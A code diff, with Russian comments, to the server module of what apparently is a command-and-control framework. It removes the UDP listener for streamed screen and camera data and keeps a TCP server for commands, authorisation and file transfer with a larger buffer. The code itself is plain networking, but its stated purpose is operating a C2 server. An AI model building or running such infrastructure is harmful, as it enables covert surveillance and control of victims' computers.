@@ -1,3 +1,5 @@
+# backend/Core/Server.py (фрагмент изменений)
+
 import asyncio
 import multiprocessing
 import webbrowser
@@ -7,47 +9,25 @@ from backend.API import run_fastapi_server
 from .ClientConnection import client_handler
 from backend.CLI.CLI import operator_interface, print_c2_ready_message
 from backend import start_benchmark
-from backend.API.api import manager  # Импорт для доступа к рассылке
 
-
-# ==========================================
-# 1-й БЛОК: UDP СЕРВЕР ДЛЯ ПОТОКОВЫХ ДАННЫХ
-# ==========================================
-class StreamingUDPProtocol(asyncio.DatagramProtocol):
-    def datagram_received(self, data, addr):
-        if len(data) < 6: return
-
-        # Вместо создания задачи, вызываем функцию напрямую
-        # manager.broadcast_packet должен быть обычным методом (не async),
-        # либо использовать call_soon
-        manager.broadcast_packet_sync(data)
-
-# ==========================================
-# 2-й БЛОК: TCP СЕРВЕР ДЛЯ ТОЧНЫХ ДАННЫХ
-# ==========================================
 async def start_server():
+    from backend.API.api import manager
     log_queue = multiprocessing.Queue()
 
-    # 1. TCP Сервер (Команды, Авторизация, Файлы)
+    # Оставляем ТОЛЬКО TCP Сервер
     server = await asyncio.start_server(
         lambda r, w: client_handler(r, w),
         IP, PORT,
         reuse_address=True,
-        backlog=1000
-    )
-
-    # 2. UDP Сервер (Стриминг экрана и камеры) на ТОМ ЖЕ порту
-    loop = asyncio.get_running_loop()
-    udp_transport, udp_protocol = await loop.create_datagram_endpoint(
-        lambda: StreamingUDPProtocol(),
-        local_addr=(IP, PORT)
+        backlog=1000,
+        # Добавь ограничение на чтение, чтобы не захлебнуться
+        limit=1024 * 1024 * 5  # 5MB буфер для тяжелых кадров
     )
 
     addr = server.sockets[0].getsockname()
-    logger.info(f"[+] TCP Server started on {addr}")
-    logger.info(f"[+] UDP Stream Listener active on {IP}:{PORT}")
+    logger.info(f"[+] TCP C2 Server started on {addr}")
+    # UDP больше не нужен
 
-    # Задачи сервера
     log_task = asyncio.create_task(logger.start_queue_listener(log_queue))
     api_task = asyncio.create_task(run_fastapi_server(IP, API_PORT))
     cli_task = asyncio.create_task(operator_interface(server))
@@ -67,7 +47,6 @@ async def start_server():
         except asyncio.CancelledError:
             logger.info("[*] Server shutdown initiated.")
         finally:
-            udp_transport.close()  # Закрываем UDP
             log_queue.put("STOP")
             api_task.cancel()
             cli_task.cancel()
